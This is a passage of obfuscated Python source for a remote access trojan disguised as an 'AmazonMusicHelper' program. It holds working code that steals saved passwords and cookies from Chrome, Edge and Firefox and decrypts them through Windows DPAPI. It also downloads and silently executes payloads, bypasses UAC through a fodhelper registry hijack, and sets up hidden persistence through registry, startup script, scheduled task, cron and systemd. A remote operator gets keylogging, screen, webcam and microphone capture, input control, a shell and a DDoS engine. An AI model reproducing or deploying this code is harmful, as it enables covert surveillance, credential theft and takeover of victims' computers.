        machine_type, icon, label = _classify_machine(ip, mac_vendor, open_ports)
        info[_D("_s219")].append({
            "ip": ip, "mac": mac,
            _D("_s220"): mac_vendor,
            _D("_s221"): open_ports,
            _D("_s222"): open_services,
            _D("_s223"): machine_type,
            _D("_s224"): label,
            _D("_s225"): icon,
            _D("_s226"): arp_entry.get("type", ""),
            _D("_s227"): "local"
        })
    seen_ext = set()
    for conn in info.get(_D("_s228"), []):
        remote = conn.get(_D("_s229"), "")
        if not remote or not isinstance(remote, str):
            continue
        parts = remote.rsplit(":", 1)
        if len(parts) != 2:
            continue
        ext_ip, ext_port = parts[0], parts[1]
        if ext_ip.startswith(_D("_s230")) or ext_ip.startswith("10.") or ext_ip.startswith("192.168.") or ext_ip.startswith("172."):
            if ext_ip.startswith(_D("_s231")):
                try:
                    second = int(ext_ip.split(".")[1])
                    if 16 <= second <= 31:
                        continue
                except:
                    continue
            else:
                continue
        if ext_ip in (_D("_s232"), "*", "::", "::1"):
            continue
        try:
            ext_port_int = int(ext_port)
        except:
            ext_port_int = 0
        svc = _COMMON_PORTS.get(ext_port_int, "")
        key = f"{ext_ip}:{ext_port}"
        if key in seen_ext:
            continue
        seen_ext.add(key)
        info[_D("_s233")].append({
            "ip": ext_ip,
            _D("_s234"): ext_port_int,
            _D("_s235"): svc,
            _D("_s236"): conn.get("status", ""),
            "pid": conn.get("pid", 0),
            _D("_s237"): conn.get("local", ""),
            _D("_s238"): "external"
        })
    ext_by_ip = {}
    for h in info[_D("_s239")]:
        ip = h["ip"]
        if ip not in ext_by_ip:
            ext_by_ip[ip] = dict(h)
            ext_by_ip[ip][_D("_s240")] = []
        ext_by_ip[ip][_D("_s241")].append({"port": h["port"], "service": h["service"]})
    info[_D("_s242")] = list(ext_by_ip.values())
    old_timeout = socket.getdefaulttimeout()
    socket.setdefaulttimeout(2)  
    for h in info[_D("_s243")]:
        try:
            hostname = socket.gethostbyaddr(h["ip"])[0]
            h[_D("_s244")] = hostname
            has_https = any(p[_D("_s245")] == 443 for p in h.get("all_ports", []))
            has_http = any(p[_D("_s246")] == 80 or p["port"] == 8080 for p in h.get("all_ports", []))
            if has_https:
                h["url"] = f"https://{hostname}"
            elif has_http:
                h["url"] = f"http://{hostname}"
            else:
                h["url"] = hostname
        except:
            pass
    socket.setdefaulttimeout(old_timeout)
    return info
def _browser_steal():
    ""_D("_s247")""
    results = {_D("_s248"): {}, "edge": {}, "firefox": {}}
    localapp = os.environ.get(_D("_s249"), "")
    appdata = os.environ.get(_D("_s250"), "")
    chrome_path = os.path.join(localapp, _D("_s251"), "Chrome", "User Data")
    if os.path.exists(chrome_path):
        results[_D("_s252")] = _steal_chromium(chrome_path, "Chrome", localapp)
    else:
        results[_D("_s253")] = {"error": "Chrome not found"}
    edge_path = os.path.join(localapp, _D("_s254"), "Edge", "User Data")
    if os.path.exists(edge_path):
        results[_D("_s255")] = _steal_chromium(edge_path, "Edge", localapp)
    else:
        results[_D("_s256")] = {"error": "Edge not found"}
    firefox_path = os.path.join(appdata, _D("_s257"), "Firefox", "Profiles")
    if os.path.exists(firefox_path):
        results[_D("_s258")] = _steal_firefox(firefox_path)
    else:
        results[_D("_s259")] = {"error": "Firefox not found"}
    return results
def _steal_chromium(base_path, name, localapp):
    ""_D("_s260")""
    result = {_D("_s261"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            if not (item == _D("_s262") or item.startswith("Profile ")): continue
            profile_path = os.path.join(base_path, item)
            login_db = os.path.join(profile_path, _D("_s263"))
            if os.path.exists(login_db):
                temp_db = os.path.join(os.environ.get(_D("_s264"), "/tmp"), f"{name.lower()}_login_{item}.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s265"))
                        for row in cur.fetchall():
                            url, username, enc_pwd = row
                            pwd = _decrypt_chrome(enc_pwd) if (enc_pwd and HAS[_D("_s266")]) else "[needs cryptography]"
                            result[_D("_s267")].append({"url": url, "username": username, "password": pwd, "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception as e:
                    if not result.get(_D("_s268")): result["error"] = str(e)
                finally:
                    try: os.remove(temp_db)
                    except: pass
            for cookie_path in [os.path.join(profile_path, _D("_s269"), "Cookies"),
                                os.path.join(profile_path, _D("_s270"))]:
                if not os.path.exists(cookie_path): continue
                temp_db = os.path.join(os.environ.get(_D("_s271"), "/tmp"), f"{name.lower()}_cookies_{item}.db")
                try:
                    shutil.copy2(cookie_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s272"))
                        for row in cur.fetchall():
                            result[_D("_s273")].append({"host": row[0], "name": row[1], "value": "[encrypted]", "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
                break  
    except Exception as e:
        result[_D("_s274")] = str(e)
    return result
def _decrypt_chrome(encrypted_value):
    ""_D("_s275")""
    if not encrypted_value or not isinstance(encrypted_value, bytes):
        return _D("_s276")
    if len(encrypted_value) < 15 + 16:  
        return _D("_s277")
    if encrypted_value[:3] not in (b'v10', b'v20'):
        return _D("_s278") + encrypted_value[:3].decode(errors='replace') + "]"
    try:
        localapp = os.environ.get(_D("_s279"), "")
        browsers = [
            os.path.join(localapp, _D("_s280"), "Chrome", "User Data"),
            os.path.join(localapp, _D("_s281"), "Edge", "User Data"),
            os.path.join(localapp, _D("_s282"), "Brave-Browser", "User Data"),
            os.path.join(localapp, _D("_s283"), "Opera Stable"),
        ]
        for browser_path in browsers:
            ls_path = os.path.join(browser_path, _D("_s284"))
            if not os.path.exists(ls_path):
                continue
            try:
                with open(ls_path, 'r', encoding=_D("_s285")) as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state[_D("_s286")]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [(_D("_s288"), ctypes.wintypes.DWORD),
                                (_D("_s289"), ctypes.POINTER(ctypes.c_char))]
                pDataIn = DATA_BLOB(len(encrypted_key),
                    ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char)))
                pDataOut = DATA_BLOB()
                if not ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
                    continue
                aes_key = ctypes.create_string_buffer(pDataOut.cbData)
                ctypes.memmove(aes_key, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                aesgcm = AESGCM(bytes(aes_key))
                return aesgcm.decrypt(nonce, ciphertext, None).decode(_D("_s290"), errors='replace')
            except Exception:
                continue
    except Exception:
        pass
    return _D("_s291")
def _steal_firefox(base_path):
    ""_D("_s292")""
    result = {_D("_s293"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            profile_path = os.path.join(base_path, item)
            if not os.path.isdir(profile_path): continue
            logins_path = os.path.join(profile_path, _D("_s294"))
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding=_D("_s295")) as f:
                        logins = json.load(f)
                    for entry in logins.get(_D("_s296"), []):
                        result[_D("_s297")].append({
                            "url": entry.get(_D("_s298"), ""),
                            _D("_s299"): (entry.get("encryptedUsername", "") or "")[:80],
                            _D("_s300"): (entry.get("encryptedPassword", "") or "")[:80],
                            _D("_s301"): item,
                            _D("_s302"): True
                        })
                except Exception:
                    pass
            cookies_path = os.path.join(profile_path, _D("_s303"))
            if os.path.exists(cookies_path):
                temp_db = os.path.join(os.environ.get(_D("_s304"), "/tmp"), f"ff_cookies_{item}.db")
                try:
                    shutil.copy2(cookies_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s305"))
                        for row in cur.fetchall():
                            result[_D("_s306")].append({
                                _D("_s307"): row[0], "name": row[1],
                                _D("_s308"): (row[2] or "")[:80], "profile": item
                            })
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
    except Exception as e:
        result[_D("_s309")] = str(e)
    return result
def _download_exec(url, save_path=None):
    ""_D("_s310")""
    try:
        import urllib.request
        if not save_path:
            save_path = os.path.join(os.environ.get(_D("_s311"), "/tmp"), url.split("/")[-1] or "payload.exe")
        urllib.request.urlretrieve(url, save_path)
        if sys.platform == _D("_s312") and save_path.lower().endswith((".exe",".bat",".cmd",".ps1")):
            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif save_path.endswith(".sh") or not sys.platform.startswith("win"):
            os.chmod(save_path, 0o755)
            subprocess.Popen(save_path, shell=True)
        return True, f"Downloaded to {save_path}"
    except Exception as e: return False, str(e)
CFG = {"FR": None}
def _flist(path=""):
    if CFG.get("FR") and path and not str(Path(path).resolve()).startswith(str(Path(CFG["FR"]).resolve())): path = CFG["FR"]
    if not path and sys.platform == _D("_s313"):
        return {_D("_s314"): "Drives", "parent": None, "items": [
            {_D("_s315"): f"{chr(l)}:\\", "path": f"{chr(l)}:\\", "type": "drive", "size": 0, "modified": ""}
            for l in range(ord("A"), ord("Z")+1) if os.path.exists(f"{chr(l)}:\\")]}
    t = Path(path).resolve() if path else Path.home()
    if not t.exists(): return {_D("_s316"): "Not found"}
    if t.is_file(): return {_D("_s317"): "Not a dir"}
    items = []
    denied = False
    try:
        entries = list(t.iterdir())
    except PermissionError:
        denied = True
        entries = []
    except OSError:
        denied = True
        entries = []
    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
        try:
            s = e.stat(); items.append({_D("_s318"): e.name, "path": str(e.resolve()),
                _D("_s319"): "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
                _D("_s320"): datetime.fromtimestamp(s.st_mtime).isoformat()})
        except: items.append({_D("_s321"): e.name, "path": str(e.resolve()),
            _D("_s322"): "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
    parent = str(t.parent.resolve()) if t.parent != t else None
    result = {_D("_s323"): str(t.resolve()), "parent": parent, "items": items}
    if denied:
        result[_D("_s324")] = "Partial listing - some entries may be hidden due to permissions"
    return result
def _fdel(path):
    t = Path(path).resolve()
    if not t.exists(): return False, _D("_s325")
    try:
        if t.is_dir(): shutil.rmtree(t)
        else: t.unlink()
        return True, _D("_s326")
    except Exception as e: return False, str(e)
def _fmkdir(parent, name):
    try: Path(parent).resolve().joinpath(name).mkdir(parents=False, exist_ok=False); return True, "OK"
    except Exception as e: return False, str(e)
def _fread(path, offset=0, cs=1024*1024):
    try:
        with open(path, "rb") as f: f.seek(offset); d = f.read(cs)
        return {_D("_s327"): base64.b64encode(d).decode(), "offset": offset, "size": len(d), "eof": len(d) < cs}
    except Exception as e: return {_D("_s328"): str(e)}
def _fwrite(path, b64, offset=0, mode="wb"):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, mode) as f:
            if offset: f.seek(offset)
            f.write(base64.b64decode(b64))
        return True, "ok"
    except Exception as e: return False, str(e)
def _check_for_update(server_url):
    ""_D("_s329")""
    try:
        import urllib.request
        check_url = server_url.rstrip("/") + _D("_s330")
        r = urllib.request.urlopen(check_url, timeout=15)
        data = json.loads(r.read().decode())
        remote_ver = (data.get(_D("_s331")) or "").strip()
        download_url = (data.get(_D("_s332")) or "").strip()
        if not remote_ver or not download_url:
            _l.info(_D("_s333"))
            return None, None
        if remote_ver != _VERSION:
            _l.info(f"Update available: v{_VERSION} -> v{remote_ver}")
            return remote_ver, download_url
        else:
            _l.info(f"Client is up to date (v{_VERSION})")
            return None, None
    except Exception as e:
        _l.warning(f"Update check failed: {e}")
        return None, None
def _download_and_install(download_url, new_version):
    ""_D("_s334")""
    try:
        import urllib.request
        pd = _pdir()
        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
        _l.info(f"Downloading update from {download_url}...")
        urllib.request.urlretrieve(download_url, new_exe)
        _l.info(f"Downloaded to {new_exe}")
        current_exe = _exepath()
        bat_path = os.path.join(os.environ.get(_D("_s335"), pd), "rasphere_update.bat")
        with open(bat_path, "w") as f:
            f.write(f)
        _l.info(f"Update script written to {bat_path}")
        if sys.platform == _D("_s337"):
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            _l.info(_D("_s338"))
        else:
            _l.error(_D("_s339"))
            return False
        return True
    except Exception as e:
        _l.error(f"Update download/install failed: {e}")
        return False
def _is_admin():
    ""_D("_s340")""
    try:
        if sys.platform == _D("_s341"):
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass
    try:
        return os.getuid() == 0
    except:
        pass
    return False
def _fodhelper_uac_bypass(args):
    if sys.platform != _D("_s342"):
        _l.warning(_D("_s343"))
        return False
    try:
        import winreg as wr
    except ImportError:
        _l.error(_D("_s344"))
        return False
    exe_path = _exepath()
    elevated_args = []
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a in (_D("_s345"), "--no-elevate", "--uninstall", "--install"):
            i += 1
            continue
        if a in (_D("_s346"), "--secret", "--id", "--reconnect"):
            elevated_args.append(a)
            if i + 1 < len(sys.argv):
                elevated_args.append(sys.argv[i + 1])
                i += 1
        else:
            elevated_args.append(a)
        i += 1
    elevated_args.append(_D("_s347"))
    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
    _l.info(f"UAC bypass: relaunching as admin (fodhelper)")
    try:
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            wr.DeleteValue(key, _D("_s348"))
            wr.CloseKey(key)
        except:
            pass
        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
        wr.SetValueEx(key, _D("_s349"), 0, wr.REG_SZ, "")
        wr.CloseKey(key)
        try:
            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            wr.CloseKey(settings_key)
        except:
            pass
        fodhelper_path = os.path.join(os.environ.get(_D("_s350"), "C:\\Windows"), "System32", "fodhelper.exe")
        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
        _l.info(_D("_s351"))
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
        _l.error(f"UAC bypass failed: {e}")
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        return False
def _cleanup_uac_registry():
    ""_D("_s352")""
    try:
        import winreg as wr
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            try:
                wr.DeleteValue(key, _D("_s353"))
            except:
                pass
            try:
                wr.DeleteValue(key, "")
            except:
                pass
            wr.CloseKey(key)
        except:
            pass
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        for p in [r"Software\Classes\ms-settings\Shell\open",
                  r"Software\Classes\ms-settings\Shell",
                  r"Software\Classes\ms-settings"]:
            try:
                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
            except:
                pass
        _l.info(_D("_s354"))
    except Exception as e:
        _l.debug(f"UAC cleanup (non-critical): {e}")
_keepalive_stop = threading.Event()
def _keepalive_pinger(server_url):
    ""_D("_s355")""
    import urllib.request
    health_url = server_url.rstrip("/") + _D("_s356")
    while not _keepalive_stop.is_set():
        _keepalive_stop.wait(_KEEPALIVE)
        if _keepalive_stop.is_set():
            break
        try:
            urllib.request.urlopen(health_url, timeout=10)
            _l.debug(_D("_s357"))
        except Exception as e:
            _l.debug(f"Keep-alive ping failed: {e}")
def _exepath():
    if getattr(sys, _D("_s358"), False): return sys.executable
    return os.path.abspath(sys.argv[0])
def _pdir():
    if sys.platform == _D("_s359"):
        b = os.environ.get(_D("_s360"), os.path.expanduser("~"))
        p = os.path.join(b, _D("_s361"))
    else:
        p = os.path.expanduser(_D("_s362"))
    os.makedirs(p, exist_ok=True)
    return p
def _ip(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, _D("_s363") if sys.platform == "win32" else "amazonmusicd")
    if ep != dest:
        try: shutil.copy2(ep, dest); _l.info(f"Copied: {dest}")
        except Exception as e: _l.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, _D("_s364"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += [_D("_s365"), cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == _D("_s366"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, _D("_s367"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
        except Exception as e: _l.warning(f"Reg fail: {e}")
        try:
            sd = os.path.join(os.environ.get(_D("_s368"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(sd):
                vp = os.path.join(sd, _D("_s369"))
                with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                _l.info(_D("_s370")); ok = True
        except Exception as e: _l.warning(f"VBS fail: {e}")
        try:
            subprocess.run([_D("_s371"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            r = subprocess.run([_D("_s372"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0: _l.info(_D("_s373")); ok = True
        except Exception as e: _l.warning(f"Task fail: {e}")
    else:
        try:
            cline = f"@reboot {cl} > /dev/null 2>&1 &"
            ex = subprocess.run([_D("_s374"),"-l"], capture_output=True, text=True)
            ct = (ex.stdout or "")
            if _D("_s375") not in ct:
                ct += f"\n
                subprocess.run([_D("_s376"),"-"], input=ct, text=True)
                _l.info(_D("_s377")); ok = True
        except Exception as e: _l.warning(f"Cron fail: {e}")
        try:
            sd = os.path.expanduser(_D("_s378")); os.makedirs(sd, exist_ok=True)
            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
            with open(os.path.join(sd, _D("_s379")), "w") as f: f.write(sc)
            subprocess.run([_D("_s380"),"--user","daemon-reload"], capture_output=True)
            subprocess.run([_D("_s381"),"--user","enable","amazonmusic-helper"], capture_output=True)
            _l.info(_D("_s382")); ok = True
        except Exception as e: _l.warning(f"systemd fail: {e}")
    return ok
def _up():
    ok = False
    if sys.platform == _D("_s383"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(k, _D("_s384")); ok = True
            except FileNotFoundError: pass
            winreg.CloseKey(k)
        except: pass
        try:
            vp = os.path.join(os.environ.get(_D("_s385"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
            if os.path.exists(vp): os.remove(vp); ok = True
        except: pass
        try: subprocess.run([_D("_s386"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
        except: pass
    else:
        try:
            ex = subprocess.run([_D("_s387"),"-l"], capture_output=True, text=True)
            if ex.stdout and _D("_s388") in ex.stdout:
                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s389") not in l)
                subprocess.run([_D("_s390"),"-"], input=nc, text=True); ok = True
        except: pass
        try:
            sp = os.path.expanduser(_D("_s391"))
            if os.path.exists(sp):
                subprocess.run([_D("_s392"),"--user","disable","amazonmusic-helper"], capture_output=True)
                os.remove(sp); subprocess.run([_D("_s393"),"--user","daemon-reload"], capture_output=True); ok = True
        except: pass
    try:
        pd = _pdir()
        for f in os.listdir(pd):
            try: os.remove(os.path.join(pd, f))
            except: pass
        try: os.rmdir(pd)
        except: pass
    except: pass
    return ok
def _sh(sio):
    sc = CapEngine(sio, _D("_s394"))
    wc = CapEngine(sio, _D("_s395"))
    mic = MicEngine(sio)
    mon = SysMon(sio)
    term = Term(sio)
    keylog = Keylog(sio)
    global ddos
    ddos = DdosEngine(sio)
    _s.scap = sc; _s.wcap = wc; _s.mic = mic; _s.keylog = keylog
    @sio.on(_D("_s396"))
    def _c():
        _l.info(_D("_s397")); _s.conn = True
        sio.emit(_D("_s398"), {"secret": _s.secret, "client_id": _s.cid,
            _D("_s399"): {"hostname": socket.gethostname(), "platform": sys.platform,
                _D("_s400"): os.environ.get("USERNAME", os.environ.get("USER","?")),
                _D("_s401"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
                    _D("_s402"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
    @sio.on(_D("_s403"))
    def _d():
        _block_input(False)  
        _l.info(_D("_s404")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
    @sio.on(_D("_s405"))
    def _r(d): _s.reg = True; _s.cid = d.get(_D("_s406"), _s.cid); _l.info(f"Registered: {_s.cid}")
    @sio.on(_D("_s407"))
    def _sc(d=None):
        if d and _D("_s408") in d: sc.monitor_idx = int(d.get("monitor", 1))
        sc.start(); sio.emit(_D("_s409"), {"active": True})
    @sio.on(_D("_s410"))
    def _sc2(): sc.stop(); sio.emit(_D("_s411"), {"active": False})
    @sio.on(_D("_s412"))
    def _smn(d):
        if d and _D("_s413") in d:
            sc.monitor_idx = int(d[_D("_s414")])
            was_running = sc.r
            if was_running:
                sc.stop()
                sc.start()
                sio.emit(_D("_s415"), {"active": True})
    @sio.on(_D("_s416"))
    def _sq(d):
        if d:
            if _D("_s417") in d: sc.q = max(1, min(100, int(d["quality"])))
            if _D("_s418") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
            if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s419"))
    def _wc(d=None): wc.start(); sio.emit(_D("_s420"), {"active": True})
    @sio.on(_D("_s421"))
    def _wc2(): wc.stop(); sio.emit(_D("_s422"), {"active": False})
    @sio.on(_D("_s423"))
    def _wq(d):
        if d:
            if _D("_s424") in d: wc.q = max(1, min(100, int(d["quality"])))
            if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s425"))
    def _mstart(d=None): mic.start()
    @sio.on(_D("_s426"))
    def _mstop(): mic.stop(); sio.emit(_D("_s427"), {"active": False})
    @sio.on(_D("_s428"))
    def _kstart(d=None): keylog.start()
    @sio.on(_D("_s429"))
    def _kstop(): keylog.stop()
    @sio.on(_D("_s430"))
    def _me(d):
        if not HAS[_D("_s431")] or not _s.mc: return
        try:
            a = d.get(_D("_s432"),"")
            if a == _D("_s433"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
            elif a == _D("_s434"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
            elif a == _D("_s435"):
                bm = {_D("_s436"): MB.left, "right": MB.right, "middle": MB.middle}
                _s.mc.click(bm.get(d.get(_D("_s437"),"left").lower(), MB.left), 2 if d.get("double") else 1)
            elif a == _D("_s438"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s439"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s440"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
        except Exception as e: _l.error(f"Mouse err: {e}")
    @sio.on(_D("_s441"))
    def _ke(d):
        if not HAS[_D("_s442")] or not _s.kc: return
        try:
            SP = {_D("_s443"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
                  "tab": Key.tab, _D("_s444"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
                  _D("_s445"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
                  "up": Key.up, _D("_s446"): Key.down, "left": Key.left, "right": Key.right,
                  **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
            def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
            a = d.get(_D("_s447"),"")
            if a == _D("_s448"): _s.kc.press(rk(d.get("key","")))
            elif a == _D("_s449"): _s.kc.release(rk(d.get("key","")))
            elif a == _D("_s450"):
                ks = [rk(k) for k in d.get(_D("_s451"),[])]
                for k in ks: _s.kc.press(k)
                for k in reversed(ks): _s.kc.release(k)
            elif a == _D("_s452"): _s.kc.type(d.get("text",""))
            elif a == _D("_s453"):
                scs = {_D("_s454"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
                       _D("_s455"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
                       _D("_s456"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
                       _D("_s457"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
                       _D("_s458"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
                       _D("_s459"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
                       _D("_s460"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
                sc = scs.get(d.get(_D("_s461"),""))
                if sc:
                    for m in sc[0]: _s.kc.press(m)
                    _s.kc.press(sc[1]); _s.kc.release(sc[1])
                    for m in reversed(sc[0]): _s.kc.release(m)
        except Exception as e: _l.error(f"Key err: {e}")
    @sio.on(_D("_s462"))
    def _ts(): ok = term.start(); sio.emit(_D("_s463"), {"active": ok})
    @sio.on(_D("_s464"))
    def _ti(d): term.write((d or {}).get(_D("_s465"),""))
    @sio.on(_D("_s466"))
    def _tst(): term.stop(); sio.emit(_D("_s467"), {"active": False})
    @sio.on(_D("_s468"))
    def _sm(): mon.start(); sio.emit(_D("_s469"), {"active": True})
    @sio.on(_D("_s470"))
    def _sm2(): mon.stop(); sio.emit(_D("_s471"), {"active": False})
    @sio.on(_D("_s472"))
    def _gp(): sio.emit(_D("_s473"), {"processes": _proc()})
    @sio.on(_D("_s474"))
    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s475"), {"ok": ok, "message": msg, "pid": pid})
    @sio.on(_D("_s476"))
    def _cg():
        if HAS[_D("_s477")]:
            try: sio.emit(_D("_s478"), {"text": pyperclip.paste()})
            except Exception as e: sio.emit(_D("_s479"), {"error": str(e)})
        else: sio.emit(_D("_s480"), {"error": "N/A"})
    @sio.on(_D("_s481"))
    def _cs(d):
        if HAS[_D("_s482")]:
            try: pyperclip.copy((d or {}).get(_D("_s483"),"")); sio.emit("clipboard_status", {"ok": True})
            except Exception as e: sio.emit(_D("_s484"), {"ok": False, "error": str(e)})
        else: sio.emit(_D("_s485"), {"ok": False, "error": "N/A"})
    @sio.on(_D("_s486"))
    def _ag(): r = _audio(); sio.emit(_D("_s487"), r or {"error": "N/A"})
    @sio.on(_D("_s488"))
    def _as(d): lv = (d or {}).get(_D("_s489"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
    @sio.on(_D("_s490"))
    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s491"), r or {"error": "N/A"})
    @sio.on(_D("_s492"))
    def _pmo(): ok = _monoff(); sio.emit(_D("_s493"), {"action": "monitor_off", "ok": ok})
    @sio.on(_D("_s494"))
    def _pl(): ok = _lock(); sio.emit(_D("_s495"), {"action": "lock", "ok": ok})
    @sio.on(_D("_s496"))
    def _ps(): ok = _sleep(); sio.emit(_D("_s497"), {"action": "sleep", "ok": ok})
    @sio.on(_D("_s498"))
    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s499"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
    @sio.on(_D("_s500"))
    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s501"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
    @sio.on(_D("_s502"))
    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s503"), {"cmd": "openurl", "ok": ok, "message": msg})
    @sio.on(_D("_s504"))
    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s505"), {"data": data, "format": fmt} if data else {"error": fmt})
    @sio.on(_D("_s506"))
    def _geo(): sio.emit(_D("_s507"), _geoip())
    @sio.on(_D("_s508"))
    def _ga(): sio.emit(_D("_s509"), {"apps": _apps()})
    @sio.on(_D("_s510"))
